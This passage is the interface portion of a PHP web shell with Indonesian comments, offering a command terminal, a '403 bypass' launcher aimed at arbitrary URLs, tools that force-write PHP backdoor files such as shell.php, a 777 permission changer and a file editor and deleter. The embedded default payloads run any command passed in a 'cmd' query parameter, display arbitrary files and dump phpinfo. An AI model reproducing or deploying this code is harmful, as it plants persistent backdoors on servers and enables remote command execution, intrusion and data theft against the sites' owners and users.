            <div class="panel">
                <h2>🔧 SERVER FEATURES</h2>
                <ul>
                    <?php foreach ($server_features as $key => $value): ?>
                        <li>
                            <strong><?php echo $key; ?>:</strong> 
                            <span class="feature-status <?php echo strpos($value, 'Available') !== false || strpos($value, 'Enabled') !== false || strpos($value, 'Yes') !== false ? 'available' : 'not-available'; ?>">
                                <?php echo $value; ?>
                            </span>
                        </li>
                    <?php endforeach; ?>
                </ul>
            </div>
        </div>

        <!-- Terminal Section -->
        <div class="terminal-container">
            <h2>💻 SYSTEM TERMINAL</h2>
            <form action="" method="post">
                <div class="form-group">
                    <label for="terminal_command">ENTER COMMAND:</label>
                    <input type="text" id="terminal_command" name="terminal_command" class="form-control" 
                           placeholder="ls -la, whoami, pwd, etc..." required>
                </div>
                <button type="submit" class="btn btn-success">EXECUTE</button>
            </form>

            <?php if (isset($_SESSION['terminal_result'])): ?>
                <div class="terminal-output">
                    <pre><strong>Command:</strong> <?php echo htmlspecialchars($_SESSION['terminal_result']['command']); ?><br>
<strong>Return Code:</strong> <?php echo $_SESSION['terminal_result']['return_var']; ?><br>
<strong>Output:</strong><br><?php echo htmlspecialchars($_SESSION['terminal_result']['output']); ?></pre>
                </div>
                <?php unset($_SESSION['terminal_result']); ?>
            <?php endif; ?>
        </div>

        <!-- Bypass Tools Section -->
        <div class="bypass-container">
            <h2>🛡️ ULTIMATE BYPASS TOOLS</h2>
            
            <div class="tabs">
                <div class="tab active" onclick="switchTab('tab-403', this)">Bypass 403</div>
                <div class="tab" onclick="switchTab('tab-zerokb', this)">Bypass 0KB</div>
                <div class="tab" onclick="switchTab('tab-custom', this)">Custom Upload</div>
                <div class="tab" onclick="switchTab('tab-permissions', this)">Fix Permissions</div>
            </div>

            <!-- Tab 1: Bypass 403 -->
            <div id="tab-403" class="tab-content active">
                <div class="form-group">
                    <h3>Bypass 403 Forbidden (Multi-Method)</h3>
                    <form action="?action=bypass_403" method="post">
                        <input type="url" name="url" class="form-control" placeholder="https://example.com/protected-path" required>
                        <button type="submit" class="btn" style="margin-top: 10px;">LAUNCH BYPASS ATTACK</button>
                    </form>
                </div>

                <?php if (isset($_SESSION['bypass_result'])): ?>
                    <div class="bypass-result">
                        <h4>🔍 Bypass Results:</h4>
                        <?php foreach ($_SESSION['bypass_result'] as $method => $result): ?>
                            <div class="method-result <?php echo $result['code'] == 200 ? 'method-success' : 'method-failed'; ?>">
                                <h5>Method: <?php echo strtoupper(str_replace('_', ' ', $method)); ?></h5>
                                <p>Status Code: 
                                    <span class="status-code status-<?php echo $result['code']; ?>">
                                        <?php echo $result['code']; ?>
                                    </span>
                                </p>
                                <p><strong>Headers Used:</strong></p>
                                <pre><?php echo htmlspecialchars(implode("\n", $result['headers'])); ?></pre>
                                <p><strong>Response Preview:</strong></p>
                                <pre><?php echo htmlspecialchars(substr($result['body'], 0, 2000)); ?></pre>
                            </div>
                        <?php endforeach; ?>
                    </div>
                    <?php unset($_SESSION['bypass_result']); ?>
                <?php endif; ?>
            </div>

            <!-- Tab 2: Bypass 0KB -->
            <div id="tab-zerokb" class="tab-content">
                <div class="form-group">
                    <h3>🚀 ULTIMATE 0KB BYPASS</h3>
                    <p><strong>6 Methods Available</strong> - Will try all methods until success</p>
                    
                    <form action="" method="post" enctype="multipart/form-data">
                        <input type="file" name="upload_file" class="form-control" required>
                        <button type="submit" class="btn btn-success" style="margin-top: 10px;">UPLOAD WITH ULTIMATE BYPASS</button>
                    </form>
                </div>

                <div class="form-group">
                    <h3>Bypass Existing 0KB File</h3>
                    <p>Select a file from current directory to bypass:</p>
                    <select id="zerokbFileSelect" class="form-control" onchange="updateZerokbForm()">
                        <option value="">-- Select File --</option>
                        <?php foreach ($files as $file): ?>
                            <?php if (filesize($file['path']) == 0 || !$file['writable']): ?>
                                <option value="<?php echo urlencode($file['path']); ?>">
                                    <?php echo htmlspecialchars($file['name']); ?> 
                                    (<?php echo $file['size']; ?>)
                                    <?php if (!$file['writable']): ?>[READ-ONLY]<?php endif; ?>
                                </option>
                            <?php endif; ?>
                        <?php endforeach; ?>
                    </select>
                    
                    <form id="zerokbForm" action="?action=bypass_zerokb" method="post" style="display: none; margin-top: 15px;">
                        <input type="hidden" id="zerokbTarget" name="target" value="">
                        <div class="form-group">
                            <label for="script_content">Custom Script Content (Optional):</label>
                            <textarea id="script_content" name="script_content" class="form-control" placeholder="Enter custom PHP code or leave empty for default bypass"><?php echo htmlspecialchars("<?php\n// Ultimate Bypass - " . date('Y-m-d H:i:s') . "\n// Force-written with multiple methods\n\necho \"✅ ULTIMATE BYPASS SUCCESSFUL!\\n\";\necho \"📁 Directory: \" . getcwd() . \"\\n\";\necho \"🐘 PHP: \" . phpversion() . \"\\n\";\necho \"👤 User: \" . (function_exists('get_current_user') ? get_current_user() : 'Unknown') . \"\\n\";\n\n// Command execution\nif (isset(\$_GET['cmd'])) {\n    echo \"🔧 Executing: {\$_GET['cmd']}\\n\";\n    system(\$_GET['cmd']);\n}\n\n// File operations\nif (isset(\$_GET['file'])) {\n    highlight_file(\$_GET['file']);\n}\n\n// PHP info\nif (isset(\$_GET['info'])) {\n    phpinfo();\n}\n?>"); ?></textarea>
                        </div>
                        <button type="submit" class="btn btn-warning">🚀 LAUNCH ULTIMATE BYPASS</button>
                    </form>
                </div>

                <?php if (isset($_SESSION['zerokb_result'])): ?>
                    <div class="bypass-result">
                        <h4>🔧 Ultimate Zero KB Bypass Results:</h4>
                        
                        <h5>📊 Method Results:</h5>
                        <?php foreach ($_SESSION['zerokb_result'] as $method => $result): ?>
                            <?php if (!is_array($result)): ?>
                                <div class="method-result <?php echo $result ? 'method-success' : 'method-failed'; ?>">
                                    <strong><?php echo strtoupper(str_replace('_', ' ', $method)); ?>:</strong>
                                    <?php echo $result ? '✅ SUCCESS' : '❌ FAILED'; ?>
                                </div>
                            <?php endif; ?>
                        <?php endforeach; ?>
                        
                        <?php if (isset($_SESSION['zerokb_result']['verification'])): ?>
                            <h5>🔍 File Verification:</h5>
                            <?php foreach ($_SESSION['zerokb_result']['verification'] as $key => $value): ?>
                                <div class="method-result">
                                    <strong><?php echo strtoupper(str_replace('_', ' ', $key)); ?>:</strong>
                                    <?php echo $value ? '✅ ' . $value : '❌ ' . $value; ?>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                        
                        <?php if (isset($_SESSION['zerokb_result']['execution_test'])): ?>
                            <h5>⚡ Execution Test:</h5>
                            <?php foreach ($_SESSION['zerokb_result']['execution_test'] as $key => $value): ?>
                                <div class="method-result <?php echo $key == 'success' && $value ? 'method-success' : 'method-failed'; ?>">
                                    <strong><?php echo strtoupper(str_replace('_', ' ', $key)); ?>:</strong>
                                    <?php 
                                    if ($key == 'success') {
                                        echo $value ? '✅ EXECUTABLE' : '❌ NOT EXECUTABLE';
                                    } else {
                                        echo htmlspecialchars($value);
                                    }
                                    ?>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                    <?php unset($_SESSION['zerokb_result']); ?>
                <?php endif; ?>
            </div>

            <!-- Tab 3: Custom Script Upload -->
            <div id="tab-custom" class="tab-content">
                <div class="form-group">
                    <h3>Upload Custom Script with Ultimate Bypass</h3>
                    <form action="?action=upload_bypass" method="post">
                        <div class="form-group">
                            <label for="bypass_filename">Filename:</label>
                            <input type="text" id="bypass_filename" name="bypass_filename" class="form-control" 
                                   placeholder="shell.php" required>
                        </div>
                        <div class="form-group">
                            <label for="bypass_content">Script Content:</label>
                            <textarea id="bypass_content" name="bypass_content" class="form-control" rows="15" required>
<?php echo htmlspecialchars("<?php\n// ULTIMATE BYPASS - CUSTOM SCRIPT\n// Created: " . date('Y-m-d H:i:s') . "\n// Server: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'Unknown') . "\n\necho \"<h1>🚀 ULTIMATE BYPASS SUCCESSFUL!</h1>\";\necho \"<p><strong>Server:</strong> \" . \$_SERVER['SERVER_SOFTWARE'] . \"</p>\";\necho \"<p><strong>PHP Version:</strong> \" . phpversion() . \"</p>\";\necho \"<p><strong>Current Directory:</strong> \" . getcwd() . \"</p>\";\n\n// Command execution\nif (isset(\$_GET['cmd'])) {\n    echo \"<h3>Command Output:</h3><pre>\";\n    system(\$_GET['cmd']);\n    echo \"</pre>\";\n}\n\n// File operations\nif (isset(\$_GET['file'])) {\n    echo \"<h3>File Content:</h3>\";\n    highlight_file(\$_GET['file']);\n}\n\n// PHP info\nif (isset(\$_GET['info'])) {\n    phpinfo();\n}\n\n// Directory listing\nif (isset(\$_GET['dir'])) {\n    echo \"<h3>Directory Listing:</h3><pre>\";\n    system('ls -la ' . escapeshellarg(\$_GET['dir']));\n    echo \"</pre>\";\n}\n?>"); ?>
                            </textarea>
                        </div>
                        <button type="submit" class="btn btn-success">🚀 UPLOAD WITH ULTIMATE BYPASS</button>
                    </form>
                </div>

                <?php if (isset($_SESSION['upload_bypass_result'])): ?>
                    <div class="bypass-result">
                        <h4>📤 Custom Script Upload Results:</h4>
                        <?php foreach ($_SESSION['upload_bypass_result'] as $method => $result): ?>
                            <?php if (!is_array($result)): ?>
                                <div class="method-result <?php echo $result ? 'method-success' : 'method-failed'; ?>">
                                    <strong><?php echo strtoupper(str_replace('_', ' ', $method)); ?>:</strong>
                                    <?php echo $result ? '✅ SUCCESS' : '❌ FAILED'; ?>
                                </div>
                            <?php endif; ?>
                        <?php endforeach; ?>
                    </div>
                    <?php unset($_SESSION['upload_bypass_result']); ?>
                <?php endif; ?>
            </div>

            <!-- Tab 4: Fix Permissions -->
            <div id="tab-permissions" class="tab-content">
                <div class="form-group">
                    <h3>🔧 Fix File Permissions</h3>
                    <p>Select a file to fix permissions:</p>
                    <select id="permFileSelect" class="form-control" onchange="updatePermForm()">
                        <option value="">-- Select File --</option>
                        <?php foreach ($files as $file): ?>
                            <option value="<?php echo urlencode($file['path']); ?>">
                                <?php echo htmlspecialchars($file['name']); ?> 
                                (Perm: <?php echo $file['permissions']; ?>)
                                <?php if (!$file['writable']): ?>[READ-ONLY]<?php endif; ?>
                            </option>
                        <?php endforeach; ?>
                        <?php foreach ($folders as $folder): ?>
                            <option value="<?php echo urlencode($folder['path']); ?>">
                                📁 <?php echo htmlspecialchars($folder['name']); ?> 
                                (Perm: <?php echo $folder['permissions']; ?>)
                                <?php if (!$folder['writable']): ?>[READ-ONLY]<?php endif; ?>
                            </option>
                        <?php endforeach; ?>
                    </select>
                    
                    <form id="permForm" action="?action=fix_permissions" method="post" style="display: none; margin-top: 15px;">
                        <input type="hidden" id="permTarget" name="target" value="">
                        <button type="submit" class="btn btn-warning">🔧 FIX PERMISSIONS (755 & 777)</button>
                    </form>
                </div>

                <?php if (isset($_SESSION['permission_result'])): ?>
                    <div class="bypass-result">
                        <h4>🔧 Permission Fix Results:</h4>
                        <?php foreach ($_SESSION['permission_result'] as $key => $value): ?>
                            <div class="method-result <?php echo $value ? 'method-success' : 'method-failed'; ?>">
                                <strong><?php echo strtoupper(str_replace('_', ' ', $key)); ?>:</strong>
                                <?php 
                                if (is_bool($value)) {
                                    echo $value ? '✅ SUCCESS' : '❌ FAILED';
                                } else {
                                    echo htmlspecialchars($value);
                                }
                                ?>
                            </div>
                        <?php endforeach; ?>
                    </div>
                    <?php unset($_SESSION['permission_result']); ?>
                <?php endif; ?>
            </div>
        </div>

        <div class="file-list">
            <h2>📁 FILESYSTEM EXPLORER</h2>
            <table class="file-table">
                <thead>
                    <tr>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Permissions</th>
                        <th>Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php if ($base_dir != '.' && $base_dir != '/'): ?>
                        <tr>
                            <td><a href="?dir=<?php echo urlencode(dirname($base_dir)); ?>" class="folder">📁 ..</a></td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                            <td>-</td>
                        </tr>
                    <?php endif; ?>

                    <?php foreach ($folders as $folder): ?>
                        <tr>
                            <td class="folder">
                                <a href="?dir=<?php echo urlencode($folder['path']); ?>">
                                    📁 <?php echo htmlspecialchars($folder['name']); ?>
                                </a>
                            </td>
                            <td><?php echo $folder['size']; ?></td>
                            <td>
                                <span class="permission-badge perm-<?php echo $folder['permissions']; ?>">
                                    <?php echo $folder['permissions']; ?>
                                </span>
                                <span class="writable-<?php echo $folder['writable'] ? 'true' : 'false'; ?>">
                                    <?php echo $folder['writable'] ? '✏️' : '🔒'; ?>
                                </span>
                            </td>
                            <td><?php echo $folder['modified']; ?></td>
                            <td class="actions">
                                <a href="#" class="btn" onclick="renameItem('<?php echo urlencode($folder['path']); ?>', '<?php echo htmlspecialchars($folder['name']); ?>')">Rename</a>
                                <?php if (!$folder['writable']): ?>
                                    <a href="?action=fix_permissions&target=<?php echo urlencode($folder['path']); ?>&dir=<?php echo urlencode($base_dir); ?>" class="btn btn-warning">Fix Perm</a>
                                <?php endif; ?>
                                <a href="?action=delete&target=<?php echo urlencode($folder['path']); ?>&dir=<?php echo urlencode($base_dir); ?>" class="btn btn-danger" onclick="return confirm('Delete this folder?')">Delete</a>
                            </td>
                        </tr>
                    <?php endforeach; ?>

                    <?php foreach ($files as $file): ?>
                        <tr>
                            <td class="file">
                                <?php echo getFileIcon($file['name']); ?> 
                                <?php echo htmlspecialchars($file['name']); ?>
                                <?php if (filesize($file['path']) == 0): ?>
                                    <span style="color: #ff4444; font-size: 0.8em;">[0KB]</span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $file['size']; ?></td>
                            <td>
                                <span class="permission-badge perm-<?php echo $file['permissions']; ?>">
                                    <?php echo $file['permissions']; ?>
                                </span>
                                <span class="writable-<?php echo $file['writable'] ? 'true' : 'false'; ?>">
                                    <?php echo $file['writable'] ? '✏️' : '🔒'; ?>
                                </span>
                                <?php if ($file['executable']): ?>
                                    <span style="color: #00ff00;">⚡</span>
                                <?php endif; ?>
                            </td>
                            <td><?php echo $file['modified']; ?></td>
                            <td class="actions">
                                <a href="?action=download&target=<?php echo urlencode($file['path']); ?>" class="btn">Download</a>
                                <a href="#" class="btn" onclick="editFile('<?php echo urlencode($file['path']); ?>', '<?php echo htmlspecialchars($file['name']); ?>')">Edit</a>
                                <a href="#" class="btn" onclick="renameItem('<?php echo urlencode($file['path']); ?>', '<?php echo htmlspecialchars($file['name']); ?>')">Rename</a>
                                <?php if (filesize($file['path']) == 0 || !$file['writable']): ?>
                                    <a href="#" class="btn btn-warning" onclick="bypassZeroKBFile('<?php echo urlencode($file['path']); ?>', '<?php echo htmlspecialchars($file['name']); ?>')">Ultimate Bypass</a>
                                <?php endif; ?>
                                <?php if (!$file['writable']): ?>
                                    <a href="?action=fix_permissions&target=<?php echo urlencode($file['path']); ?>&dir=<?php echo urlencode($base_dir); ?>" class="btn btn-warning">Fix Perm</a>
                                <?php endif; ?>
                                <a href="?action=delete&target=<?php echo urlencode($file['path']); ?>&dir=<?php echo urlencode($base_dir); ?>" class="btn btn-danger" onclick="return confirm('Delete this file?')">Delete</a>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                </tbody>
            </table>
        </div>

        <div class="panel">
            <h2>🐘 PHP INFORMATION</h2>
            <p><a href="#" class="btn" onclick="showPhpInfo()">VIEW PHP INFO</a></p>
        </div>
    </div>

    <!-- Modal untuk Rename -->
    <div class="modal" id="renameModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>RENAME ITEM</h3>
                <span class="close" onclick="closeModal('renameModal')">&times;</span>
            </div>
            <form action="" method="post">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" id="renameTarget" name="target" value="">
                <div class="form-group">
                    <label for="newName">NEW NAME:</label>
                    <input type="text" id="newName" name="new_name" class="form-control" required>
                </div>
                <button type="submit" class="btn">RENAME</button>
            </form>
        </div>
    </div>

    <!-- Modal untuk Edit File -->
    <div class="modal" id="editModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>EDIT FILE: <span id="editFileName"></span></h3>
                <span class="close" onclick="closeModal('editModal')">&times;</span>
            </div>
            <form action="" method="post">
                <input type="hidden" name="action" value="edit">
                <input type="hidden" id="editTarget" name="target" value="">
                <div class="form-group">
                    <label for="fileContent">FILE CONTENT:</label>
                    <textarea id="fileContent" name="content" class="form-control" rows="15"></textarea>
                </div>
                <button type="submit" class="btn">SAVE CHANGES</button>
            </form>
        </div>
    </div>

    <!-- Modal untuk Bypass 0KB -->
    <div class="modal" id="zerokbModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>🚀 ULTIMATE BYPASS: <span id="zerokbFileName"></span></h3>
                <span class="close" onclick="closeModal('zerokbModal')">&times;</span>
            </div>
            <form action="?action=bypass_zerokb" method="post">
                <input type="hidden" id="zerokbModalTarget" name="target" value="">
                <div class="form-group">
                    <label for="zerokbScriptContent">CUSTOM SCRIPT CONTENT (6 Methods Will Be Tried):</label>
                    <textarea id="zerokbScriptContent" name="script_content" class="form-control" rows="10" placeholder="Enter custom PHP code or leave empty for default bypass"><?php echo htmlspecialchars("<?php\n// ULTIMATE BYPASS - " . date('Y-m-d H:i:s') . "\n// Force-written with multiple methods\n\necho \"✅ ULTIMATE BYPASS SUCCESSFUL!\\n\";\necho \"📁 Directory: \" . getcwd() . \"\\n\";\necho \"🐘 PHP: \" . phpversion() . \"\\n\";\n\n// Command execution\nif (isset(\$_GET['cmd'])) {\n    echo \"🔧 Executing: {\$_GET['cmd']}\\n\";\n    system(\$_GET['cmd']);\n}\n\n// File operations\nif (isset(\$_GET['file'])) {\n    highlight_file(\$_GET['file']);\n}\n\n// PHP info\nif (isset(\$_GET['info'])) {\n    phpinfo();\n}\n?>"); ?></textarea>
                </div>
                <button type="submit" class="btn btn-warning">🚀 LAUNCH ULTIMATE BYPASS (6 METHODS)</button>
            </form>
        </div>
    </div>

    <!-- Modal untuk PHP Info -->
    <div class="modal" id="phpInfoModal">
        <div class="modal-content">
            <div class="modal-header">
                <h3>PHP INFORMATION</h3>
                <span class="close" onclick="closeModal('phpInfoModal')">&times;</span>
            </div>
            <div style="max-height: 400px; overflow-y: auto;">
                <?php
                ob_start();
                phpinfo();
                $phpinfo = ob_get_clean();
                $phpinfo = preg_replace('%^.*<body>(.*)</body>.*$%ms', '$1', $phpinfo);
                echo $phpinfo;
                ?>
            </div>
        </div>
    </div>

    <script>
        // Sembunyikan loading screen setelah halaman selesai dimuat
        window.addEventListener('load', function() {
            setTimeout(function() {
                document.getElementById('loadingScreen').style.display = 'none';
            }, 1500);
        });

        // Fungsi untuk switch tab
        function switchTab(tabId, element) {
            var tabContents = document.getElementsByClassName('tab-content');
            for (var i = 0; i < tabContents.length; i++) {
                tabContents[i].classList.remove('active');
            }
            
            var tabs = document.getElementsByClassName('tab');
            for (var i = 0; i < tabs.length; i++) {
                tabs[i].classList.remove('active');
            }
            
            document.getElementById(tabId).classList.add('active');
            element.classList.add('active');
        }

        // Fungsi untuk update form bypass 0KB
        function updateZerokbForm() {
            var select = document.getElementById('zerokbFileSelect');
            var form = document.getElementById('zerokbForm');
            var target = document.getElementById('zerokbTarget');
            
            if (select.value) {
                target.value = select.value;
                form.style.display = 'block';
            } else {
                form.style.display = 'none';
            }
        }

        // Fungsi untuk update form permissions
        function updatePermForm() {
            var select = document.getElementById('permFileSelect');
            var form = document.getElementById('permForm');
            var target = document.getElementById('permTarget');
            
            if (select.value) {
                target.value = select.value;
                form.style.display = 'block';
            } else {
                form.style.display = 'none';
            }
        }

        // Fungsi untuk menampilkan modal rename
        function renameItem(target, currentName) {
            document.getElementById('renameTarget').value = target;
            document.getElementById('newName').value = currentName;
            document.getElementById('renameModal').style.display = 'flex';
        }

        // Fungsi untuk menampilkan modal edit file
        function editFile(target, fileName) {
            document.getElementById('editTarget').value = target;
            document.getElementById('editFileName').textContent = fileName;
            
            fetch('?action=get_content&target=' + encodeURIComponent(target))
                .then(response => response.text())
                .then(data => {
                    document.getElementById('fileContent').value = data;
                })
                .catch(error => {
                    console.error('Error:', error);
                    document.getElementById('fileContent').value = 'Error loading file content.';
                });
            
            document.getElementById('editModal').style.display = 'flex';
        }

        // Fungsi untuk bypass 0KB file
        function bypassZeroKBFile(target, fileName) {
            document.getElementById('zerokbModalTarget').value = target;
            document.getElementById('zerokbFileName').textContent = fileName;
            document.getElementById('zerokbModal').style.display = 'flex';
        }

        // Fungsi untuk menampilkan PHP Info
        function showPhpInfo() {
            document.getElementById('phpInfoModal').style.display = 'flex';
        }

        // Fungsi untuk menutup modal
        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        // Tutup modal ketika mengklik di luar konten modal
        window.onclick = function(event) {
            const modals = document.getElementsByClassName('modal');
            for (let i = 0; i < modals.length; i++) {
                if (event.target == modals[i]) {
                    modals[i].style.display = 'none';
                }
            }
        }

        // Fokus pada input terminal saat halaman dimuat
        document.addEventListener('DOMContentLoaded', function() {
            const terminalInput = document.getElementById('terminal_command');
            if (terminalInput) {
                terminalInput.focus();
            }
        });
    </script>
</body>
</html>